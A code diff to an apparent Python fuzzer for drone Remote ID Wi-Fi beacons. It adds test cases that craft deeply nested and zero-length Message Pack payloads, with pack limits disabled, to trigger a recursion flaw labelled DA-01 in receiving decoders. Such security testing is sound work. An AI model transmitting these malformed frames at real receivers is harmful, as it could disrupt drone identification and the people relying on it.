@@ -52,9 +52,30 @@ def build_auth_page_n(page_num: int, auth_data: bytes = b'\x00' * 23,
     return header + body
 
 
+# Usable Remote ID payload inside a single ASTM Wi-Fi vendor IE:
+#   255 (max IE length) - OUI(3) - [APP_CODE, counter, type/ver, msg_size, msg_count](5)
+OTA_FRAME_BUDGET = 247
+
+
+def build_deep_nested_pack(budget: int = OTA_FRAME_BUDGET) -> bytes:
+    """
+    Build a maximally-nested Message Pack blob: a single sub-message that is
+    itself a Message Pack, nested as deeply as `budget` bytes allow. Decoders
+    that recurse into Type-0xF sub-messages without restricting the sub-message
+    type (DA-01) descend one level per nesting (depth ~= budget/3). Bounded by
+    the frame budget, so it is transmittable over the air in one beacon.
+    """
+    blob = bytes([(MsgType.PACK << 4) | 0x02, 0x00, 0x00])  # innermost empty pack
+    while 3 + len(blob) <= budget:
+        blob = bytes([(MsgType.PACK << 4) | 0x02, len(blob) & 0xFF, 0x01]) + blob
+    return blob
+
+
 class FuzzCategory:
     PACK_HEADER = "pack_header"
+    PACK_ZEROLEN = "pack_zerolen"
     NESTED_PACKS = "nested_packs"
+    NESTED_DEEP = "nested_deep"
     AUTH_PAGINATION = "auth_pages"
     STRING_INJECTION = "string_inject"
     KINEMATICS = "kinematics"
@@ -64,7 +85,7 @@ class FuzzCategory:
 
     @classmethod
     def all_choices(cls) -> list:
-        return [cls.PACK_HEADER, cls.NESTED_PACKS, cls.AUTH_PAGINATION, cls.STRING_INJECTION, cls.KINEMATICS, cls.TIMESTAMP, cls.PROTOCOL_VERSION, cls.ALL]
+        return [cls.PACK_HEADER, cls.PACK_ZEROLEN, cls.NESTED_PACKS, cls.NESTED_DEEP, cls.AUTH_PAGINATION, cls.STRING_INJECTION, cls.KINEMATICS, cls.TIMESTAMP, cls.PROTOCOL_VERSION, cls.ALL]
 
 
 class RidFuzzer:
@@ -168,6 +189,14 @@ class RidFuzzer:
             desc = f"Message Pack Header Fuzzing -> Config Overrides: {cfg}"
             return msgs, cfg, desc
 
+        elif active_cat == FuzzCategory.PACK_ZEROLEN:
+            # Pinned DA-01 original: top-level pack with msg_size=0, msg_count=255
+            # -> receiver iterates 255 empty sub-slices (flat loop, no recursion).
+            msgs = build_all_messages(drone)
+            cfg = {"pack_msg_size": 0x00, "pack_msg_count": 0xFF, "disable_pack_limit": True}
+            desc = "Pack Zero-Length (pinned) -> msg_size=0x00, msg_count=0xFF (DA-01 flat loop)"
+            return msgs, cfg, desc
+
         elif active_cat == FuzzCategory.NESTED_PACKS:
             mode = self._iteration % 3
             if mode == 0:
@@ -191,6 +220,20 @@ class RidFuzzer:
                 msgs = [build_basic_id(drone.serial), p1[:25], p2[:25]]
                 desc = "Nested Message Packs -> Deep Nesting Chain: Multiple sequential Type 0xF headers in payload"
             return msgs, {}, desc
+
+        elif active_cat == FuzzCategory.NESTED_DEEP:
+            # Maximally-nested single pack: one sub-message that is itself a pack,
+            # nested ~budget/3 levels deep (DA-01 recursive worst case). The outer
+            # pack header is overridden so its single sub-message IS the whole blob.
+            blob = build_deep_nested_pack()
+            cfg = {
+                "pack_msg_size": len(blob) & 0xFF,
+                "pack_msg_count": 1,
+                "disable_pack_limit": True,
+            }
+            desc = (f"Nested Message Packs -> Deep Recursion: single {len(blob)}-byte "
+                    f"maximally-nested Type 0xF pack (~depth {len(blob) // 3})")
+            return [blob], cfg, desc
 
         elif active_cat == FuzzCategory.AUTH_PAGINATION:
             mode = self._iteration % 3
